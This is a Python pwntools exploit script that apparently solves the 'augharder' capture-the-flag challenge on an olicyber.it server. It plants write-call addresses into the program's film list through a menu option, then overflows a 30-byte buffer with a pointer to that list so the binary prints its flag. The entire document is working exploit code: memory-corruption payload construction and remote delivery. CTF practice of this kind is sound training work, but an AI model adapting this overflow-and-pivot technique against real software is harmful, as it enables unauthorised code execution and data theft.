from pwn import *

exe = ELF("./augharder_patched")

context.binary = exe

HOST = "augharder.challs.olicyber.it"
PORT = 10607

gdbscript = """
b *0x08048c3a
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process([exe.path]) 
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

NULL = pack(0x0)
FLAG_LEN = pack(0x1c)

FLAG = pack(exe.symbols.film_preferito)
LIST = pack(exe.symbols.lista_film + 4)

WRITE = pack(exe.symbols.beta_write)

def fix(gadget):
    return str(int.from_bytes(gadget[::-1])).encode()

def setup_list(r):
    payload = [
        WRITE, NULL, FLAG, FLAG_LEN
    ]

    for idx, gadget in enumerate(payload):
        r.sendlineafter(b"> ", b"3")
        r.sendlineafter(b": ", str(idx + 1).encode())
        r.sendlineafter(b": ", fix(gadget))

def ret2puts(r):
    payload = b"a" * 30 + LIST
    
    r.sendlineafter(b"> ", b"5")
    r.sendlineafter(b": ", payload)

def main():
    r = conn()

    setup_list(r)
    ret2puts(r)
    
    r.interactive()

if __name__ == "__main__":
    main()
